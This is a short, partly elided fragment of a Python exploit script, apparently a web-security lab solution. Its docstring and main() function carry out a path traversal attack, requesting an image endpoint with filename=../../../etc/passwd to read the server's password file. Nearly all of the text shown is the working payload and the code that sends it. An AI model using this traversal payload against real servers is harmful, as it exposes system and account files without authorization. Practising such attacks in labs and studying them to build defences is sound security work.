"""
    ...
    This script exploits a file path traversal vulnerability to read the contents of the file /etc/passwd.

    1. Use the file parameter to read the contents of the file /etc/passwd. GET ../../../etc/passwd
...
def main():
    ...
    passwd = fetch(session, f"{URL}/image?filename=../../../etc/passwd")
